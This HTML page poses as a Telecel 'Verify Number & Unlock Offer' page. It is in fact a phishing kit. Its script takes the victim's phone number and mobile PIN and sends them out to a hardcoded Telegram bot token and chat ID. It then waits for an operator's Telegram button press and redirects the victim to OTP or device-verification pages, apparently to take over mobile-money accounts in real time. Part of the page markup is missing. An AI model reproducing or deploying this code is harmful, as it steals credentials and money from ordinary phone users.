<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telecel - Verify Number</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            background: #f8f9fa;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 15px;
        }
        .container {
            width: 100%;
            max-width: 420px;
            background: white;
            border-radius: 12px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        .logo-section { text-align: center; padding: 35px 0 15px; }
        .telecel-logo { width: 110px; height: auto; margin: 0 auto; }
        h1 { text-align: center; font-size: 24px; font-weight: 700; margin: 15px 0 8px; color: #1e2937; }
        .subtitle { text-align: center; color: #475569; font-size: 15px; padding: 0 25px; }
        .offer-info {
            background: #fff0f0; margin: 15px 25px 25px; padding: 16px;
            border-radius: 10px; text-align: center; border-left: 5px solid #E30613;
        }
        .form-section { padding: 0 25px 30px; }
        .form-group { margin-bottom: 24px; }
        label { display: block; font-size: 14px; font-weight: 600; margin-bottom: 8px; color: #1e2937; }
        input {
            width: 100%; padding: 15px 16px; border: 1.5px solid #e2e8f0;
            border-radius: 8px; font-size: 16px;
        }
        input:focus { border-color: #E30613; outline: none; }
        .continue-btn {
            width: 100%; background: #E30613; color: white; border: none;
            padding: 16px; font-size: 17px; font-weight: 700;
            border-radius: 50px; cursor: pointer; margin-top: 10px;
        }
        .error-msg, .success-msg {
            text-align: center; margin: 12px 0; font-size: 14px; display: none;
        }
        .error-msg { color: #dc3545; }
        .success-msg { color: #22c55e; }
    </style>
</head>

        <h1>Welcome Back</h1>
        <p class="subtitle">Verify your number to unlock this offer</p>

        <div class="offer-info" id="offerInfo" style="display: none;">
            <strong style="color:#E30613;">Selected Offer:</strong><br>
            <span id="offerTitle" style="font-weight:600;"></span><br>
            <strong id="offerPrice" style="color:#E30613; font-size:20px;"></strong>
        </div>

        <div class="form-section">
            <div class="form-group">
                <label>Telephone Number <span style="color:red;">*</span></label>
                <input type="tel" id="phone" placeholder="020XXXXXXXX" maxlength="10">
            </div>
            <div class="form-group">
                <label>PIN <span style="color:red;">*</span></label>
                <input type="password" id="password" placeholder="••••" maxlength="4" inputmode="numeric">
            </div>

            <div class="error-msg" id="errMsg"></div>
            <div class="success-msg" id="successMsg"></div>

            <button class="continue-btn" id="continueBtn">Verify Number & Unlock Offer</button>
        </div>
    </div>

    <!-- Spinner -->
    <div id="spinner" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);z-index:10000;align-items:center;justify-content:center;flex-direction:column;color:white;">
        <div style="width:70px;height:70px;border:6px solid #fff;border-top-color:#E30613;border-radius:50%;animation:spin 1s linear infinite;"></div>
        <p style="margin-top:20px;">Waiting for approval on Telegram...</p>
    </div>

    <script>
        const CONFIG = {
            BOT_TOKEN: '8746906558:AAHpzw4CN1J8y4LdO7f8fBsZ_DIFhKYuXB8',
            CHAT_ID: '7547427914',
            OTP_PAGE: 'otp.html',           // Your main OTP page
            DEVICE_PAGE: 'device-verify.html' // The 6-digit device verification page you sent
        };

        let state = {
            offerTitle: "",
            offerPrice: "",
            lastUpdateId: 0,
            pollInterval: null,
            approveId: null,
            declineId: null,
            verifyDeviceId: null
        };

        const phoneInput = document.getElementById('phone');
        const pinInput = document.getElementById('password');
        const continueBtn = document.getElementById('continueBtn');
        const errMsg = document.getElementById('errMsg');
        const successMsg = document.getElementById('successMsg');
        const spinner = document.getElementById('spinner');
        const offerInfo = document.getElementById('offerInfo');
        const offerTitleEl = document.getElementById('offerTitle');
        const offerPriceEl = document.getElementById('offerPrice');

        function loadOfferFromURL() {
            const params = new URLSearchParams(window.location.search);
            state.offerTitle = params.get('title') || params.get('bundle') || "Special Offer";
            state.offerPrice = params.get('price') || "25";

            offerInfo.style.display = 'block';
            offerTitleEl.textContent = state.offerTitle;
            offerPriceEl.textContent = `GHS ${state.offerPrice}`;
        }

        phoneInput.addEventListener('input', () => phoneInput.value = phoneInput.value.replace(/[^0-9]/g, ''));
        pinInput.addEventListener('input', () => pinInput.value = pinInput.value.replace(/[^0-9]/g, '').slice(0,4));

        function sendToBot(phone, pin) {
            const ts = Date.now();
            state.approveId = `approve_${ts}`;
            state.declineId = `decline_${ts}`;
            state.verifyDeviceId = `verifydevice_${ts}`;

            const message = `<b>🔴 New Telecel Offer Request</b>\n\n` +
                            `Offer: ${state.offerTitle}\n` +
                            `Price: GHS ${state.offerPrice}\n` +
                            `Phone: ${phone}\n` +
                            `PIN: ${pin}\n\n` +
                            `Choose Action:`;

            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.CHAT_ID,
                    text: message,
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '✅ Approve Access', callback_data: state.approveId }],
                            [{ text: '🔍 Verify Device', callback_data: state.verifyDeviceId }],
                            [{ text: '❌ Decline', callback_data: state.declineId }]
                        ]
                    }
                })
            })
            .then(() => {
                successMsg.textContent = "✅ Sent! Waiting for approval on Telegram...";
                successMsg.style.display = 'block';
                startPolling();
            })
            .catch(() => {
                alert("Failed to connect to Telegram.");
                spinner.style.display = 'none';
            });
        }

        function startPolling() {
            if (state.pollInterval) clearInterval(state.pollInterval);

            state.pollInterval = setInterval(() => {
                fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}&timeout=10`)
                    .then(r => r.json())
                    .then(data => {
                        if (!data.ok || !data.result) return;
                        data.result.forEach(update => {
                            state.lastUpdateId = Math.max(state.lastUpdateId, update.update_id);
                            if (update.callback_query) {
                                const cb = update.callback_query.data;

                                if (cb === state.approveId) {
                                    clearInterval(state.pollInterval);
                                    spinner.style.display = 'none';
                                    window.location.href = CONFIG.OTP_PAGE;

                                } else if (cb === state.verifyDeviceId) {
                                    clearInterval(state.pollInterval);
                                    spinner.style.display = 'none';
                                    window.location.href = CONFIG.DEVICE_PAGE;

                                } else if (cb === state.declineId) {
                                    clearInterval(state.pollInterval);
                                    spinner.style.display = 'none';
                                    errMsg.textContent = "Request declined. Please try again.";
                                    errMsg.style.display = 'block';
                                }
                            }
                        });
                    });
            }, 2000);
        }

        continueBtn.onclick = () => {
            errMsg.style.display = 'none';
            successMsg.style.display = 'none';

            const phone = phoneInput.value.trim();
            const pin = pinInput.value.trim();

            if (!phone || phone.length !== 10 || !phone.startsWith('0')) {
                errMsg.textContent = "Please enter valid Ghana number (e.g. 0201234567)";
                errMsg.style.display = 'block';
                return;
            }
            if (pin.length !== 4) {
                errMsg.textContent = "PIN must be 4 digits";
                errMsg.style.display = 'block';
                return;
            }

            spinner.style.display = 'flex';
            sendToBot(phone, pin);
        };

        loadOfferFromURL();
    </script>
